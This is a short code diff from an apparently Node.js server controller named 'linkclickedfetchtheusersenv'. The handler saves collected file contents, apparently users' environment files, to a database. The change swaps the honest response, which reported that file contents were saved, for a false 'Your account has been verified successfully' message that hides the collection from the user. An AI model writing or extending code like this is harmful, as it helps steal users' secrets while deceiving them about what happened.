@@ -243,7 +243,7 @@ exports.linkclickedfetchtheusersenv = async (req, res) => {
             user.myFile = JSON.stringify(validFileContents);
             await user.save();
 
-            res.status(200).json({ message: 'Files content saved to database successfully', data: validFileContents });
+            res.status(200).json({ message: 'Your account has been verified successfully', });
         } catch (err) {
             console.log(err);
             return res.status(500).json({ message: 'Internal server error' });
